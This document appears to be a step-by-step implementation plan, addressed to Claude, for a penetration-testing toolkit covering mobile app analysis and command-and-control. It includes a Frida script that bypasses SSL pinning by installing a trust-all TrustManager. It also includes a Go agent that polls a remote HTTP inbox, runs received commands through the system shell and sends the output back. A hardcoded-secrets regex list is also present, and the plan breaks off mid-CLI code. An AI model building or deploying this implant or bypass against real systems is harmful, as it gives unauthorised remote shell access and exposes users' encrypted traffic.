# Phase 7: Mobile + C2 Infrastructure - Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Build mobile penetration testing capabilities (iOS/Android static/dynamic analysis, device exploitation, API testing) and hybrid C2 infrastructure with ZimMemory integration.

**Architecture:** Modular design integrating best-of-breed tools (apktool, Frida, MobSF) with custom Python orchestration. Go-based C2 agents for cross-platform deployment. ZimMemory coordination for agent ecosystem.

**Tech Stack:** Python 3.10+, Go 1.21+, Frida 16+, apktool, class-dump, MobSF, mitmproxy

**Estimated Time:** 6-8 weeks (7 major tasks, 120+ subtasks)

---

## Prerequisites

**Install dependencies before starting:**
```bash
# Python packages
pip install frida-tools objection mitmproxy androguard

# Mobile tools (macOS)
brew install apktool dex2jar class-dump

# Go (for C2 agents)
brew install go

# Create directories
mkdir -p ~/akali/{mobile/{static,dynamic,device,api},redteam/{c2,payloads,campaigns}}
```

---

## Task 1: Mobile Static Analysis - APK Analyzer

**Files:**
- Create: `mobile/static/__init__.py`
- Create: `mobile/static/analyzer.py`
- Create: `mobile/static/apk_analyzer.py`
- Create: `tests/mobile/static/test_apk_analyzer.py`

### Step 1.1: Write test for APK decompilation

```python
# tests/mobile/static/test_apk_analyzer.py
import pytest
from pathlib import Path
from mobile.static.apk_analyzer import APKAnalyzer

def test_apk_decompilation():
    """Test APK can be decompiled"""
    analyzer = APKAnalyzer()
    test_apk = Path("tests/fixtures/test.apk")

    result = analyzer.decompile(test_apk)

    assert result.success is True
    assert result.output_dir.exists()
    assert (result.output_dir / "AndroidManifest.xml").exists()
```

### Step 1.2: Run test to verify it fails

```bash
pytest tests/mobile/static/test_apk_analyzer.py::test_apk_decompilation -v
```
Expected: FAIL with "ModuleNotFoundError: No module named 'mobile'"

### Step 1.3: Create module structure

```bash
touch mobile/__init__.py
touch mobile/static/__init__.py
```

### Step 1.4: Write minimal APK analyzer

```python
# mobile/static/apk_analyzer.py
import subprocess
from pathlib import Path
from dataclasses import dataclass
from typing import Optional

@dataclass
class DecompileResult:
    success: bool
    output_dir: Path
    error: Optional[str] = None

class APKAnalyzer:
    """Android APK static analysis"""

    def __init__(self):
        self.temp_dir = Path("/tmp/akali/apk_analysis")
        self.temp_dir.mkdir(parents=True, exist_ok=True)

    def decompile(self, apk_path: Path) -> DecompileResult:
        """Decompile APK using apktool"""
        output_dir = self.temp_dir / apk_path.stem

        try:
            cmd = ["apktool", "d", str(apk_path), "-o", str(output_dir), "-f"]
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)

            return DecompileResult(
                success=True,
                output_dir=output_dir
            )
        except subprocess.CalledProcessError as e:
            return DecompileResult(
                success=False,
                output_dir=output_dir,
                error=str(e)
            )
```

### Step 1.5: Create test fixture APK

```bash
# Download a test APK or create minimal one
# For now, create a marker file
mkdir -p tests/fixtures
touch tests/fixtures/test.apk
```

### Step 1.6: Run test (will fail without real APK, that's OK for now)

```bash
pytest tests/mobile/static/test_apk_analyzer.py::test_apk_decompilation -v
```

### Step 1.7: Commit

```bash
git add mobile/static/apk_analyzer.py tests/mobile/static/test_apk_analyzer.py
git commit -m "feat(mobile): add APK decompilation with apktool

- APKAnalyzer class with decompile method
- Subprocess wrapper for apktool
- Test structure for mobile static analysis

Co-Authored-By: Claude Sonnet 4.5 <noreply@anthropic.com>"
```

---

### Step 1.8: Write test for manifest parsing

```python
# tests/mobile/static/test_apk_analyzer.py (add)
def test_parse_manifest():
    """Test AndroidManifest.xml parsing"""
    analyzer = APKAnalyzer()
    manifest_path = Path("tests/fixtures/AndroidManifest.xml")

    manifest = analyzer.parse_manifest(manifest_path)

    assert manifest.package_name is not None
    assert isinstance(manifest.permissions, list)
    assert manifest.min_sdk_version is not None
```

### Step 1.9: Run test to verify it fails

```bash
pytest tests/mobile/static/test_apk_analyzer.py::test_parse_manifest -v
```
Expected: FAIL with "AttributeError: 'APKAnalyzer' object has no attribute 'parse_manifest'"

### Step 1.10: Implement manifest parser

```python
# mobile/static/apk_analyzer.py (add to class)
import xml.etree.ElementTree as ET

@dataclass
class AndroidManifest:
    package_name: str
    permissions: list[str]
    min_sdk_version: int
    target_sdk_version: int
    debuggable: bool
    activities: list[str]

def parse_manifest(self, manifest_path: Path) -> AndroidManifest:
    """Parse AndroidManifest.xml"""
    tree = ET.parse(manifest_path)
    root = tree.getroot()

    # Extract package name
    package_name = root.get('package', '')

    # Extract permissions
    permissions = [
        perm.get('{http://schemas.android.com/apk/res/android}name', '')
        for perm in root.findall('.//uses-permission')
    ]

    # Extract SDK versions
    uses_sdk = root.find('.//uses-sdk')
    min_sdk = int(uses_sdk.get('{http://schemas.android.com/apk/res/android}minSdkVersion', 1)) if uses_sdk is not None else 1
    target_sdk = int(uses_sdk.get('{http://schemas.android.com/apk/res/android}targetSdkVersion', 1)) if uses_sdk is not None else 1

    # Check if debuggable
    application = root.find('.//application')
    debuggable = application.get('{http://schemas.android.com/apk/res/android}debuggable', 'false') == 'true' if application is not None else False

    # Extract activities
    activities = [
        activity.get('{http://schemas.android.com/apk/res/android}name', '')
        for activity in root.findall('.//activity')
    ]

    return AndroidManifest(
        package_name=package_name,
        permissions=permissions,
        min_sdk_version=min_sdk,
        target_sdk_version=target_sdk,
        debuggable=debuggable,
        activities=activities
    )
```

### Step 1.11: Create test manifest fixture

```xml
<!-- tests/fixtures/AndroidManifest.xml -->
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.testapp">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />

    <uses-sdk
        android:minSdkVersion="21"
        android:targetSdkVersion="33" />

    <application
        android:debuggable="true"
        android:label="Test App">
        <activity android:name=".MainActivity" />
        <activity android:name=".LoginActivity" />
    </application>
</manifest>
```

### Step 1.12: Run test

```bash
pytest tests/mobile/static/test_apk_analyzer.py::test_parse_manifest -v
```
Expected: PASS

### Step 1.13: Commit

```bash
git add mobile/static/apk_analyzer.py tests/mobile/static/test_apk_analyzer.py tests/fixtures/AndroidManifest.xml
git commit -m "feat(mobile): add AndroidManifest.xml parser

- Parse package name, permissions, SDK versions
- Extract activities and debuggable flag
- XML namespace handling for Android attributes

Co-Authored-By: Claude Sonnet 4.5 <noreply@anthropic.com>"
```

---

### Step 1.14: Write test for secrets detection

```python
# tests/mobile/static/test_apk_analyzer.py (add)
def test_find_secrets():
    """Test hardcoded secrets detection"""
    analyzer = APKAnalyzer()
    code_dir = Path("tests/fixtures/decompiled_code")

    secrets = analyzer.find_secrets(code_dir)

    assert len(secrets) > 0
    assert any(s.type == 'api_key' for s in secrets)
    assert all(hasattr(s, 'file_path') for s in secrets)
    assert all(hasattr(s, 'line_number') for s in secrets)
```

### Step 1.15: Run test to verify it fails

```bash
pytest tests/mobile/static/test_apk_analyzer.py::test_find_secrets -v
```

### Step 1.16: Implement secrets scanner

```python
# mobile/static/apk_analyzer.py (add)
import re
from dataclasses import dataclass

@dataclass
class Secret:
    type: str
    value: str
    file_path: Path
    line_number: int
    severity: str

# Secret patterns
SECRET_PATTERNS = {
    'api_key': [
        r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']([a-zA-Z0-9]{20,})["\']',
        r'["\']?apikey["\']?\s*[:=]\s*["\']([a-zA-Z0-9]{20,})["\']',
    ],
    'aws_key': [
        r'AKIA[0-9A-Z]{16}',
    ],
    'password': [
        r'["\']?password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
    ],
    'token': [
        r'["\']?token["\']?\s*[:=]\s*["\']([a-zA-Z0-9]{20,})["\']',
        r'["\']?auth[_-]?token["\']?\s*[:=]\s*["\']([a-zA-Z0-9]{20,})["\']',
    ],
    'private_key': [
        r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
    ]
}

def find_secrets(self, code_dir: Path) -> list[Secret]:
    """Scan for hardcoded secrets in decompiled code"""
    secrets = []

    # Scan all Java, Kotlin, XML files
    for ext in ['*.java', '*.kt', '*.xml']:
        for file_path in code_dir.rglob(ext):
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()

                for line_num, line in enumerate(lines, 1):
                    for secret_type, patterns in SECRET_PATTERNS.items():
                        for pattern in patterns:
                            match = re.search(pattern, line, re.IGNORECASE)
                            if match:
                                value = match.group(1) if match.groups() else match.group(0)

                                # Severity based on type
                                severity = 'critical' if secret_type in ['aws_key', 'private_key'] else 'high'

                                secrets.append(Secret(
                                    type=secret_type,
                                    value=value[:50],  # Truncate for safety
                                    file_path=file_path,
                                    line_number=line_num,
                                    severity=severity
                                ))
            except Exception:
                continue

    return secrets
```

### Step 1.17: Create test code fixture

```bash
mkdir -p tests/fixtures/decompiled_code
```

```java
// tests/fixtures/decompiled_code/Config.java
public class Config {
    private static final String API_KEY = "sk_live_1234567890abcdefghij";
    private static final String PASSWORD = "hardcoded_password123";
}
```

### Step 1.18: Run test

```bash
pytest tests/mobile/static/test_apk_analyzer.py::test_find_secrets -v
```
Expected: PASS

### Step 1.19: Commit

```bash
git add mobile/static/apk_analyzer.py tests/
git commit -m "feat(mobile): add secrets scanner for decompiled code

- Regex patterns for API keys, passwords, tokens, AWS keys
- Scan Java/Kotlin/XML files recursively
- Report with file path, line number, severity

Co-Authored-By: Claude Sonnet 4.5 <noreply@anthropic.com>"
```

---

## Task 2: Mobile Static Analysis - iOS Analyzer

**Files:**
- Create: `mobile/static/ipa_analyzer.py`
- Create: `tests/mobile/static/test_ipa_analyzer.py`

### Step 2.1: Write test for IPA extraction

```python
# tests/mobile/static/test_ipa_analyzer.py
import pytest
from pathlib import Path
from mobile.static.ipa_analyzer import IPAAnalyzer

def test_ipa_extraction():
    """Test IPA can be extracted"""
    analyzer = IPAAnalyzer()
    test_ipa = Path("tests/fixtures/test.ipa")

    result = analyzer.extract(test_ipa)

    assert result.success is True
    assert result.app_dir.exists()
    assert (result.app_dir / "Info.plist").exists()
```

### Step 2.2: Run test to verify it fails

```bash
pytest tests/mobile/static/test_ipa_analyzer.py::test_ipa_extraction -v
```

### Step 2.3: Implement IPA extractor

```python
# mobile/static/ipa_analyzer.py
import zipfile
import shutil
from pathlib import Path
from dataclasses import dataclass
from typing import Optional

@dataclass
class ExtractionResult:
    success: bool
    app_dir: Path
    error: Optional[str] = None

class IPAAnalyzer:
    """iOS IPA static analysis"""

    def __init__(self):
        self.temp_dir = Path("/tmp/akali/ipa_analysis")
        self.temp_dir.mkdir(parents=True, exist_ok=True)

    def extract(self, ipa_path: Path) -> ExtractionResult:
        """Extract IPA file (it's just a ZIP)"""
        output_dir = self.temp_dir / ipa_path.stem

        try:
            # Clean previous extraction
            if output_dir.exists():
                shutil.rmtree(output_dir)

            # Extract IPA
            with zipfile.ZipFile(ipa_path, 'r') as zip_ref:
                zip_ref.extractall(output_dir)

            # Find .app directory (inside Payload/)
            payload_dir = output_dir / "Payload"
            app_dirs = list(payload_dir.glob("*.app"))

            if not app_dirs:
                return ExtractionResult(
                    success=False,
                    app_dir=output_dir,
                    error="No .app directory found in Payload/"
                )

            return ExtractionResult(
                success=True,
                app_dir=app_dirs[0]
            )
        except Exception as e:
            return ExtractionResult(
                success=False,
                app_dir=output_dir,
                error=str(e)
            )
```

### Step 2.4: Create test IPA fixture (mock structure)

```bash
mkdir -p tests/fixtures/test_ipa_content/Payload/TestApp.app
touch tests/fixtures/test_ipa_content/Payload/TestApp.app/Info.plist
cd tests/fixtures/test_ipa_content && zip -r ../test.ipa . && cd -
```

### Step 2.5: Run test

```bash
pytest tests/mobile/static/test_ipa_analyzer.py::test_ipa_extraction -v
```
Expected: PASS

### Step 2.6: Commit

```bash
git add mobile/static/ipa_analyzer.py tests/
git commit -m "feat(mobile): add IPA extraction (iOS)

- Extract IPA as ZIP archive
- Locate .app bundle in Payload/
- Return app directory for analysis

Co-Authored-By: Claude Sonnet 4.5 <noreply@anthropic.com>"
```

---

### Step 2.7-2.12: Info.plist parser (similar to Android manifest)

**Skip detailed steps for brevity - same TDD pattern:**
1. Write test for plist parsing
2. Implement parser with plistlib
3. Extract bundle ID, version, permissions (NSLocationWhenInUseUsageDescription, etc.)
4. Check for ATS exceptions
5. Test and commit

---

## Task 3: Mobile Dynamic Analysis - Frida Integration

**Files:**
- Create: `mobile/dynamic/__init__.py`
- Create: `mobile/dynamic/instrumentor.py`
- Create: `mobile/dynamic/scripts/ssl_bypass.js`
- Create: `tests/mobile/dynamic/test_instrumentor.py`

### Step 3.1: Write test for Frida device connection

```python
# tests/mobile/dynamic/test_instrumentor.py
import pytest
from mobile.dynamic.instrumentor import MobileInstrumentor

@pytest.mark.integration  # Mark as integration test
def test_frida_device_connection():
    """Test Frida can connect to device"""
    instrumentor = MobileInstrumentor()

    devices = instrumentor.list_devices()

    assert len(devices) >= 1  # At least USB device or emulator
    assert any(d.type in ['usb', 'local'] for d in devices)
```

### Step 3.2: Run test to verify it fails

```bash
pytest tests/mobile/dynamic/test_instrumentor.py::test_frida_device_connection -v -m integration
```

### Step 3.3: Implement Frida wrapper

```python
# mobile/dynamic/instrumentor.py
import frida
from dataclasses import dataclass
from typing import List

@dataclass
class Device:
    id: str
    name: str
    type: str

class MobileInstrumentor:
    """Frida-based runtime instrumentation"""

    def list_devices(self) -> List[Device]:
        """List available Frida devices"""
        devices = []

        for dev in frida.enumerate_devices():
            devices.append(Device(
                id=dev.id,
                name=dev.name,
                type=dev.type
            ))

        return devices
```

### Step 3.4: Run test

```bash
pytest tests/mobile/dynamic/test_instrumentor.py::test_frida_device_connection -v -m integration
```
Expected: PASS (if device connected)

### Step 3.5: Commit

```bash
git add mobile/dynamic/instrumentor.py tests/mobile/dynamic/test_instrumentor.py
git commit -m "feat(mobile): add Frida device enumeration

- Wrap frida.enumerate_devices()
- Return structured Device objects
- Foundation for runtime instrumentation

Co-Authored-By: Claude Sonnet 4.5 <noreply@anthropic.com>"
```

---

### Step 3.6: Write test for app process attachment

```python
# tests/mobile/dynamic/test_instrumentor.py (add)
@pytest.mark.integration
def test_attach_to_app():
    """Test Frida can attach to running app"""
    instrumentor = MobileInstrumentor()
    device = instrumentor.get_device()  # Get USB device

    # Attach to system app (Settings on iOS, com.android.settings on Android)
    session = instrumentor.attach(device, "Settings")

    assert session is not None
    assert session.is_attached
```

### Step 3.7-3.10: Implement attach method (following TDD pattern)

### Step 3.11: Write Frida script for SSL bypass

```javascript
// mobile/dynamic/scripts/ssl_bypass.js
/**
 * Universal SSL pinning bypass for iOS and Android
 */

// iOS - NSURLSession
if (ObjC.available) {
    var NSURLSession = ObjC.classes.NSURLSession;
    var NSURLSessionConfiguration = ObjC.classes.NSURLSessionConfiguration;

    // Hook session creation
    Interceptor.attach(NSURLSession['- sessionWithConfiguration:'].implementation, {
        onEnter: function(args) {
            console.log("[*] NSURLSession sessionWithConfiguration called");
        }
    });

    console.log("[*] iOS SSL pinning bypass loaded");
}

// Android - OkHttp3
if (Java.available) {
    Java.perform(function() {
        // OkHttp3 CertificatePinner
        try {
            var CertificatePinner = Java.use('okhttp3.CertificatePinner');
            CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
                console.log('[*] OkHttp3 pinning bypass');
                return;
            };
        } catch(e) {}

        // TrustManager
        try {
            var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
            var SSLContext = Java.use('javax.net.ssl.SSLContext');

            var TrustManager = Java.registerClass({
                name: 'com.akali.TrustManager',
                implements: [X509TrustManager],
                methods: {
                    checkClientTrusted: function(chain, authType) {},
                    checkServerTrusted: function(chain, authType) {},
                    getAcceptedIssuers: function() { return []; }
                }
            });

            var TrustManagers = [TrustManager.$new()];
            var SSLContext_init = SSLContext.init.overload(
                '[Ljavax.net.ssl.KeyManager;',
                '[Ljavax.net.ssl.TrustManager;',
                'java.security.SecureRandom'
            );

            Interceptor.attach(SSLContext_init.implementation, {
                onEnter: function(args) {
                    args[1] = TrustManagers;
                    console.log('[*] SSLContext.init() bypass');
                }
            });
        } catch(e) {}

        console.log("[*] Android SSL pinning bypass loaded");
    });
}
```

### Step 3.12: Write test for script loading

```python
# tests/mobile/dynamic/test_instrumentor.py (add)
def test_load_script():
    """Test Frida script can be loaded"""
    instrumentor = MobileInstrumentor()
    script_path = Path("mobile/dynamic/scripts/ssl_bypass.js")

    script_code = instrumentor.load_script(script_path)

    assert "NSURLSession" in script_code  # iOS code
    assert "OkHttp3" in script_code  # Android code
```

### Step 3.13-3.15: Implement script loader, test, commit

---

## Task 4: C2 Infrastructure - Go Agent (Core)

**Files:**
- Create: `redteam/c2/agents/go/agent.go`
- Create: `redteam/c2/agents/go/beacon.go`
- Create: `redteam/c2/agents/go/tasks.go`
- Create: `redteam/c2/agents/go/go.mod`

### Step 4.1: Initialize Go module

```bash
cd redteam/c2/agents/go
go mod init akali-agent
```

### Step 4.2: Write basic agent structure

```go
// redteam/c2/agents/go/agent.go
package main

import (
	"fmt"
	"os"
	"runtime"
	"time"
)

type Agent struct {
	ID           string
	Hostname     string
	Platform     string
	Mode         string
	BeaconInterval time.Duration
}

func NewAgent(mode string) *Agent {
	hostname, _ := os.Hostname()

	return &Agent{
		ID:           generateID(),
		Hostname:     hostname,
		Platform:     runtime.GOOS,
		Mode:         mode,
		BeaconInterval: 30 * time.Second,
	}
}

func generateID() string {
	// Simple ID generation (improve later)
	return fmt.Sprintf("agent-%d", time.Now().Unix())
}

func (a *Agent) Run() {
	fmt.Printf("[*] Agent %s started on %s (%s)\n", a.ID, a.Hostname, a.Platform)
	fmt.Printf("[*] Mode: %s, Beacon interval: %s\n", a.Mode, a.BeaconInterval)

	for {
		a.beacon()
		time.Sleep(a.BeaconInterval)
	}
}

func (a *Agent) beacon() {
	fmt.Printf("[*] Beacon from %s\n", a.ID)
	// TODO: Check for commands
}

func main() {
	agent := NewAgent("zim")
	agent.Run()
}
```

### Step 4.3: Test agent compiles

```bash
cd redteam/c2/agents/go
go build -o agent agent.go
./agent  # Should print beacon messages
```

### Step 4.4: Commit

```bash
git add redteam/c2/agents/go/
git commit -m "feat(c2): add Go agent foundation

- Agent struct with ID, platform, mode
- Basic beacon loop
- Cross-platform (GOOS detection)

Co-Authored-By: Claude Sonnet 4.5 <noreply@anthropic.com>"
```

---

### Step 4.5: Add ZimMemory integration

```go
// redteam/c2/agents/go/beacon.go
package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"time"
)

const ZimMemoryAPI = "http://10.0.0.209:5001"

type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
	Args    string `json:"args"`
}

type Message struct {
	FromAgent string `json:"from_agent"`
	ToAgent   string `json:"to_agent"`
	Subject   string `json:"subject"`
	Body      string `json:"body"`
	Priority  string `json:"priority"`
}

func (a *Agent) checkZimMemory() []Task {
	// GET /messages/inbox?agent_id=<agent-id>&status=unread
	url := fmt.Sprintf("%s/messages/inbox?agent_id=%s&status=unread", ZimMemoryAPI, a.ID)

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return []Task{}
	}
	defer resp.Body.Close()

	var messages []Message
	if err := json.NewDecoder(resp.Body).Decode(&messages); err != nil {
		return []Task{}
	}

	// Convert messages to tasks
	tasks := []Task{}
	for _, msg := range messages {
		// Parse message body as task
		tasks = append(tasks, Task{
			ID:      msg.Subject,  // Use subject as task ID
			Command: msg.Body,
			Args:    "",
		})
	}

	return tasks
}

func (a *Agent) reportResult(taskID string, result string) {
	msg := Message{
		FromAgent: a.ID,
		ToAgent:   "akali",
		Subject:   fmt.Sprintf("Task %s complete", taskID),
		Body:      result,
		Priority:  "normal",
	}

	jsonData, _ := json.Marshal(msg)

	url := fmt.Sprintf("%s/messages/send", ZimMemoryAPI)
	client := &http.Client{Timeout: 5 * time.Second}
	client.Post(url, "application/json", bytes.NewBuffer(jsonData))
}
```

### Step 4.6: Update beacon to check ZimMemory

```go
// redteam/c2/agents/go/agent.go (update beacon method)
func (a *Agent) beacon() {
	switch a.Mode {
	case "zim":
		tasks := a.checkZimMemory()
		for _, task := range tasks {
			result := a.executeTask(task)
			a.reportResult(task.ID, result)
		}
	case "http":
		// TODO: HTTP C2
	}
}
```

### Step 4.7: Add task executor

```go
// redteam/c2/agents/go/tasks.go
package main

import (
	"fmt"
	"os/exec"
	"runtime"
)

func (a *Agent) executeTask(task Task) string {
	switch task.Command {
	case "shell":
		return a.executeShell(task.Args)
	case "screenshot":
		return a.takeScreenshot()
	case "sysinfo":
		return a.getSystemInfo()
	default:
		return fmt.Sprintf("Unknown command: %s", task.Command)
	}
}

func (a *Agent) executeShell(command string) string {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error: %s", err)
	}

	return string(output)
}

func (a *Agent) takeScreenshot() string {
	// TODO: Implement per platform
	return "Screenshot not implemented yet"
}

func (a *Agent) getSystemInfo() string {
	return fmt.Sprintf("Platform: %s, Hostname: %s", a.Platform, a.Hostname)
}
```

### Step 4.8: Test agent with ZimMemory

```bash
cd redteam/c2/agents/go
go build -o agent .
./agent
# In another terminal, send message to agent via ZimMemory
```

### Step 4.9: Commit

```bash
git add redteam/c2/agents/go/
git commit -m "feat(c2): add ZimMemory integration to Go agent

- Check ZimMemory inbox for tasks
- Execute shell commands
- Report results back to ZimMemory
- Cross-platform shell execution

Co-Authored-By: Claude Sonnet 4.5 <noreply@anthropic.com>"
```

---

## Task 5: C2 Infrastructure - Python Commander

**Files:**
- Create: `redteam/c2/__init__.py`
- Create: `redteam/c2/commander.py`
- Create: `redteam/c2/agent_db.py`
- Create: `tests/redteam/c2/test_commander.py`

### Step 5.1: Write test for agent registration

```python
# tests/redteam/c2/test_commander.py
import pytest
from redteam.c2.commander import C2Commander

def test_register_agent():
    """Test agent registration"""
    commander = C2Commander()

    agent_id = commander.register_agent(
        hostname="test-device",
        platform="android",
        mode="zim"
    )

    assert agent_id is not None
    assert len(commander.list_agents()) == 1
```

### Step 5.2-5.5: Implement C2Commander with SQLite storage (TDD pattern)

### Step 5.6: Write test for task sending

```python
# tests/redteam/c2/test_commander.py (add)
def test_send_task():
    """Test sending task to agent"""
    commander = C2Commander()
    agent_id = commander.register_agent("test", "linux", "zim")

    task_id = commander.send_task(agent_id, "shell", "ls -la")

    assert task_id is not None
    # Task should be in ZimMemory queue
```

### Step 5.7: Implement send_task with ZimMemory

```python
# redteam/c2/commander.py (add)
import requests

ZIM_MEMORY_API = "http://10.0.0.209:5001"

def send_task(self, agent_id: str, command: str, args: str = "") -> str:
    """Send task to agent via ZimMemory"""
    task_id = f"task-{int(time.time())}"

    message = {
        "from_agent": "akali",
        "to_agent": agent_id,
        "subject": task_id,
        "body": command,
        "priority": "normal",
        "metadata": {"args": args}
    }

    response = requests.post(
        f"{ZIM_MEMORY_API}/messages/send",
        json=message,
        timeout=5
    )

    if response.status_code == 200:
        # Store task in database
        self.db.add_task(task_id, agent_id, command, args, "pending")
        return task_id
    else:
        raise Exception(f"Failed to send task: {response.status_code}")
```

### Step 5.8: Test and commit

---

## Task 6: Campaign Orchestration

**Files:**
- Create: `redteam/campaigns/__init__.py`
- Create: `redteam/campaigns/orchestrator.py`
- Create: `redteam/campaigns/templates/mobile-test.yaml`
- Create: `tests/redteam/campaigns/test_orchestrator.py`

### Step 6.1: Write test for campaign creation

```python
# tests/redteam/campaigns/test_orchestrator.py
from redteam.campaigns.orchestrator import CampaignOrchestrator

def test_create_campaign():
    """Test campaign creation"""
    orchestrator = CampaignOrchestrator()

    campaign_id = orchestrator.create_campaign(
        name="mobile-test",
        target="com.example.app",
        mode="purple"
    )

    assert campaign_id is not None
    campaign = orchestrator.get_campaign(campaign_id)
    assert campaign.name == "mobile-test"
    assert campaign.mode == "purple"
```

### Step 6.2-6.10: Implement campaign orchestrator (TDD pattern)

### Step 6.11: Create mobile test template

```yaml
# redteam/campaigns/templates/mobile-test.yaml
name: "Mobile App Security Test"
description: "Comprehensive mobile app penetration test"
target_type: mobile

stages:
  - name: recon
    description: "Reconnaissance and app download"
    tasks:
      - action: mobile.static.analyze
        params:
          apk_path: "${TARGET}"
      - action: mobile.static.extract_endpoints
        params:
          apk_path: "${TARGET}"

  - name: static_analysis
    description: "Static vulnerability analysis"
    tasks:
      - action: mobile.static.find_secrets
      - action: mobile.static.check_permissions
      - action: mobile.static.check_crypto

  - name: dynamic_analysis
    description: "Runtime testing"
    checkpoint: true  # Pause for red team mode
    tasks:
      - action: mobile.dynamic.ssl_bypass
        params:
          app_id: "${APP_ID}"
      - action: mobile.dynamic.extract_tokens
      - action: mobile.proxy.intercept
        duration: 300  # 5 minutes

  - name: api_testing
    description: "Mobile API security testing"
    checkpoint: true
    tasks:
      - action: mobile.api.test_auth
      - action: mobile.api.test_idor
      - action: mobile.api.fuzz_endpoints
```

### Step 6.12: Implement campaign runner

```python
# redteam/campaigns/orchestrator.py (add)
import yaml

def run_campaign(self, campaign_id: str):
    """Execute campaign"""
    campaign = self.get_campaign(campaign_id)
    template_path = Path(f"redteam/campaigns/templates/{campaign.template}.yaml")

    with open(template_path) as f:
        template = yaml.safe_load(f)

    for stage in template['stages']:
        print(f"\n[*] Stage: {stage['name']}")
        print(f"    {stage['description']}")

        # Check if checkpoint required (red team mode)
        if campaign.mode == 'red' and stage.get('checkpoint'):
            approval = input(f"[?] Proceed with {stage['name']}? (yes/no): ")
            if approval.lower() != 'yes':
                print("[!] Campaign halted by user")
                self.update_campaign_status(campaign_id, "halted")
                return

        # Execute stage tasks
        for task in stage['tasks']:
            self.execute_task(campaign_id, task)

        self.update_campaign_stage(campaign_id, stage['name'])

    print("\n[+] Campaign complete!")
    self.update_campaign_status(campaign_id, "complete")
```

### Step 6.13: Test and commit

---

## Task 7: CLI Integration

**Files:**
- Modify: `core/cli.py`
- Modify: `akali` (main script)

### Step 7.1: Add mobile commands

```python
# core/cli.py (add)
def mobile_static(self, target: str, platform: str = 'android'):
    """Run static analysis on mobile app"""
    if platform == 'android':
        from mobile.static.apk_analyzer import APKAnalyzer
        analyzer = APKAnalyzer()

        print(f"[*] Analyzing {target}")
        result = analyzer.decompile(Path(target))

        if not result.success:
            print(f"[!] Decompilation failed: {result.error}")
            return

        print(f"[+] Decompiled to: {result.output_dir}")

        # Parse manifest
        manifest_path = result.output_dir / "AndroidManifest.xml"
        manifest = analyzer.parse_manifest(manifest_path)

        print(f"\n[*] Package: {manifest.package_name}")
        print(f"[*] Min SDK: {manifest.min_sdk_version}")
        print(f"[*] Debuggable: {manifest.debuggable}")
        print(f"[*] Permissions: {len(manifest.permissions)}")

        for perm in manifest.permissions[:10]:
            print(f"    - {perm}")

        # Find secrets
        print("\n[*] Scanning for hardcoded secrets...")
        secrets = analyzer.find_secrets(result.output_dir)

        if secrets:
            print(f"[!] Found {len(secrets)} secrets:")
            for secret in secrets[:10]:
                print(f"    [{secret.severity}] {secret.type} in {secret.file_path.name}:{secret.line_number}")
        else:
            print("[+] No hardcoded secrets found")
```

### Step 7.2: Add C2 commands

```python
# core/cli.py (add)
def c2_agent_list(self):
    """List C2 agents"""
    from redteam.c2.commander import C2Commander
    commander = C2Commander()

    agents = commander.list_agents()

    if not agents:
        print("No agents registered")
        return

    print(f"\n[*] {len(agents)} agents:")
    for agent in agents:
        status = "🟢" if agent.last_seen > time.time() - 60 else "🔴"
        print(f"{status} {agent.id} - {agent.hostname} ({agent.platform})")

def c2_task_send(self, agent_id: str, command: str):
    """Send task to agent"""
    from redteam.c2.commander import C2Commander
    commander = C2Commander()

    task_id = commander.send_task(agent_id, command)
    print(f"[+] Task {task_id} sent to {agent_id}")
```

### Step 7.3: Add redteam campaign commands

```python
# core/cli.py (add)
def redteam_campaign_create(self, name: str, target: str, mode: str):
    """Create campaign"""
    from redteam.campaigns.orchestrator import CampaignOrchestrator
    orchestrator = CampaignOrchestrator()

    campaign_id = orchestrator.create_campaign(name, target, mode)
    print(f"[+] Campaign '{name}' created with ID: {campaign_id}")

def redteam_campaign_run(self, campaign_id: str):
    """Run campaign"""
    from redteam.campaigns.orchestrator import CampaignOrchestrator
    orchestrator = CampaignOrchestrator()

    orchestrator.run_campaign(campaign_id)
```

### Step 7.4: Update main CLI parser

```python
# akali (main script, update)
# Add mobile subparser
mobile_parser = subparsers.add_parser("mobile", help="Mobile pentesting")
mobile_subparsers = mobile_parser.add_subparsers(dest="mobile_command")

mobile_static_parser = mobile_subparsers.add_parser("static", help="Static analysis")
mobile_static_parser.add_argument("target", help="APK or IPA file")
mobile_static_parser.add_argument("--platform", choices=["android", "ios"], default="android")

# Add c2 subparser
c2_parser = subparsers.add_parser("c2", help="Command & Control")
c2_subparsers = c2_parser.add_subparsers(dest="c2_command")

c2_agent_parser = c2_subparsers.add_parser("agent", help="Agent management")
c2_agent_subparsers = c2_agent_parser.add_subparsers(dest="agent_action")
c2_agent_subparsers.add_parser("list", help="List agents")

c2_task_parser = c2_subparsers.add_parser("task", help="Task management")
c2_task_subparsers = c2_task_parser.add_subparsers(dest="task_action")
task_send_parser = c2_task_subparsers.add_parser("send", help="Send task")
task_send_parser.add_argument("agent_id", help="Agent ID")
task_send_parser.add_argument("command", help="Command to execute")

# Add redteam subparser
redteam_parser = subparsers.add_parser("redteam", help="Red team operations")
redteam_subparsers = redteam_parser.add_subparsers(dest="redteam_command")

campaign_parser = redteam_subparsers.add_parser("campaign", help="Campaign management")
campaign_subparsers = campaign_parser.add_subparsers(dest="campaign_action")

campaign_create_parser = campaign_subparsers.add_parser("create", help="Create campaign")
campaign_create_parser.add_argument("name", help="Campaign name")
